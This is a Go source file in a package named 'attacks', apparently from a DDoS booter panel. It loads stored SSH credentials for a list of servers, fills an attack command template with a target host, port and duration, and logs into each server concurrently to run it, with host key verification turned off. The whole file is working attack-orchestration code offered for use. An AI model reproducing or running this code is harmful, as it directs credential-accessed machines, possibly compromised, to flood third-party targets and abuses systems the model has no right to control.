package attacks

import (
	"fmt"
	"log"
	"strings"
	"time"
	"webserver/src/config"
	"webserver/src/database"

	"golang.org/x/crypto/ssh"
)

func AttackSSH(host string, port string, tm string, method string) {
	servers, err := database.FetchSSH()
	if err != nil {
		log.Printf("(ssh/err) %s", err)
		return
	}

	if servers == nil {
		return
	}
	for _, server := range servers {
		for _, v := range config.Cfg.SSHMethods {
			if method == v.Name {
				cmd := BuildCommand(v.Command, host, port, tm)
				go SendCommand(*server, cmd)
				fmt.Printf("[DEBUG] %s:%d -> %s\r\n", server.Host, server.Port, cmd)
			}
		}
	}

}

func BuildCommand(cmd string, host string, port string, tm string) string {
	replacer := strings.NewReplacer(
		"[HOST]", host,
		"[PORT]", port,
		"[TIME]", tm,
	)
	return replacer.Replace(cmd)
}

func SendCommand(server database.SSH_SERVERS, cmd string) {
	var sshConfig = &ssh.ClientConfig{
		User: server.Username,
		Auth: []ssh.AuthMethod{
			ssh.Password(server.Password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}
	conn, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", server.Host, server.Port), sshConfig)
	if err != nil {
		log.Printf("(ssh_error) %s", err)
		return
	}
	defer conn.Close()

	session, err := conn.NewSession()
	if err != nil {
		log.Printf("(ssh_error) %s", err)
		return
	}
	defer session.Close()
	err = session.Run(cmd)
	if err != nil {
		return
	}

}
